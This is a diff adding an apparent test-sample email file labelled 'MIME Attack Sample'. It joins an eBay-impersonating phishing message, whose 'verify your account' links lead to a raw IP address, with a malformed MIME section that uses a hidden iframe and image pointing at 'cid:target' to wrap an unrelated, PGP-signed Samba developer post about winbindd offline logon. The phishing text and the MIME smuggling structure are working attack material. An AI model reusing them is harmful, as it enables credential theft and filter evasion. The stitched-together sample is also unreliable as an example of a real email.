@@ -1,0 +1,114 @@
+From: promo@mvpsportsbook.com
+To: bsifmtwbrj@777.net.cn
+Subject: MIME Attack Sample
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<head>
+<title>Untitled Document</title>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859=
+-1">
+</head>
+
+<body>
+<p><a href=3D"http://216.69.156.203/ebays/accounts/secure/das676bsda6gwcv7=
+zfcwfcwf34gfwf23g265f134f3fg3f&bhdfahva685hwsKeyBankISAPI.dllPaymentLandin=
+g&ssPageName=3DhhpayUSf&=3Duserhgads&secure&ssl7r2vbd7d88klmnogh.html"><im=
+g src=3D"http://pics.ebaystatic.com/aw/pics/navbar/eBayLogoTM.gif" border=3D=
+"0"></a> 
+</p>
+<p><font size=3D"2" face=3D"Verdana, Arial, Helvetica, sans-serif">Dear eB=
+ay User,</font></p>
+<p><font size=3D"2" face=3D"Verdana, Arial, Helvetica, sans-serif"> During=
+ our regular update 
+  and verification of the accounts, we could not verify your current infor=
+mation. 
+  Either your information has changed or it is incomplete.</font></p>
+<p><font size=3D"2" face=3D"Verdana, Arial, Helvetica, sans-serif"> As a r=
+esult, your access 
+  to bid or buy on eBay has been restricted. To start using fully your eBa=
+y account, 
+  please update and verify your information by clicking the link below :</=
+font></p>
+<p><font size=3D"2" face=3D"Verdana, Arial, Helvetica, sans-serif"> <a hre=
+f=3D"http://216.69.156.203/ebays/accounts/secure/das676bsda6gwcv7zfcwfcwf3=
+4gfwf23g265f134f3fg3f&bhdfahva685hwsKeyBankISAPI.dllPaymentLanding&ssPageN=
+ame=3DhhpayUSf&=3Duserhgads&secure&ssl7r2vbd7d88klmnogh.html">CLICK 
+  HERE TO VERIFY YOUR ACCOUNT</a></font></p>
+<p><font size=3D"2" face=3D"Verdana, Arial, Helvetica, sans-serif">Thank y=
+ou for your 
+  prompt attention to this matter.</font></p>
+<p><font size=3D"2" face=3D"Verdana, Arial, Helvetica, sans-serif"> Regard=
+s,<br>
+  eBay Inc.</font></p>
+</body>
+</html>
+
+----5975231085273427--
+Content-Type: text/html
+<iframe width="1" height="25" src="cid:target" frameborder="0"></iframe><img    width="1" height="1"  src="cid:target">
+--BOUNDARY
+Content-ID: <target>
+Content-Type: text/plain
+BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+simo wrote:
+
+> Yes, the cache should help, but there are still some backends 
+> that can safely be queried when offline.
+
+I spent some more time thinking about this and it doesn't
+really matter.    For example, idmap_nss is really only
+needed by applications that deal in tokens like smbd.
+The offlne logon geature is strictly for use by PAM
+enabled applications,  And in that case, the process will
+only deal in gids.  So if a user has logged in once
+(which he or she must have in order to logon while offline),
+the the appropriate SID/uid/gid mappings have been cached.
+Same thing fro idmap_passdb.
+
+idmap_rid should not be used for SIDs that you cannot
+determine the type for which means that by definition you
+have already cached that information as well.
+
+I think you are dealing in theoreticals without actually
+having tested a working system.
+
+> In fact you shouldn't allocate if you are not able to 
+> validate the SID. When offline allocation functions should
+> probably not be called (previously the validation code
+> was in idmap so it was easy to avoid problems ...)
+
+You misunderstand the design of the offline logon feature
+then.  The basic premise is that the core winbindd code does
+not change.  So we don't have to have special code in each
+winbindd API call (auth being the exception).  The cache manager
+must be able to answer the query without calling the underlying
+backends which are not guaranteed to work offline.  The fact
+that some can is irrelevant.  The idmap cache manager must
+not be required to know which ones can and which one cannot.
+This is why you cannot delete expired entries from the
+idmap_cache.tdb as you were previously doing.
+
+After I've finished regression testing in the next day or so,
+if you can give me a specific example where it is necessary
+to actually call into an idmap backend while offline to make
+something work wecan deal with that case.  But talking about
+theoretical possibilities leads to bloated code.
+
+
+
+
+
+cheers, jerry
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGPxSAIR7qMdg1EfYRAvKrAJ9BfC0Zj/TN0LkqvLU/hXKw0YFDQwCghpT8
+9SRfS+oHi1ZzZzn+SeD9NJw=
+=gI7b
+-----END PGP SIGNATURE-----
+
